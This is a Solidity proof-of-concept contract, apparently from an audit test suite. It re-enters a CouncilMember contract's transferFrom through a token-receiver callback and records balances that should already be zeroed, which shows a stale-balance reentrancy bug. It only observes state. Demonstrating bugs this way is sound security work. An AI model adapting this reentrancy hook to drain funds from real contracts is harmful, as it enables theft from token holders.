// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {CouncilMember} from "contracts/sablier/core/CouncilMember.sol";
import {ITokenReceiver} from "../interfaces/ITokenReceiver.sol";

/// @title TransferFromReentrancyAttacker
/// @notice Exploits the transferFrom() reentrancy window. During the TELCOIN.safeTransfer
///         callback inside CouncilMember.transferFrom, records the balance that should
///         already be zeroed but isn't. The recorded observations let the test prove the
///         stale-balance bug.
contract TransferFromReentrancyAttacker is ITokenReceiver {
    CouncilMember public target;
    uint256 public tokenId;
    bool private _entered;

    bool public callbackFired;
    uint256 public staleBalanceDuringCallback;
    uint256 public balanceIndexRead;
    uint256 public amountReceived;
    uint256 public balances1During;
    uint256 public runningBalanceDuring;
    uint256 public totalSupplyDuring;

    constructor(CouncilMember target_, uint256 tokenId_) {
        target = target_;
        tokenId = tokenId_;
    }

    function onTokenReceived(address, uint256 amount) external {
        if (!_entered) {
            _entered = true;
            callbackFired = true;
            amountReceived = amount;

            // Read various state to understand what's visible during the callback
            totalSupplyDuring = target.totalSupply();
            runningBalanceDuring = target.runningBalance();

            uint256 balIdx = target.tokenIdToBalanceIndex(tokenId);
            balanceIndexRead = balIdx;
            staleBalanceDuringCallback = target.balances(balIdx);

            // Also read balances[1] to see if it's correct
            try target.balances(1) returns (uint256 b1) {
                balances1During = b1;
            } catch {}
        }
    }
}
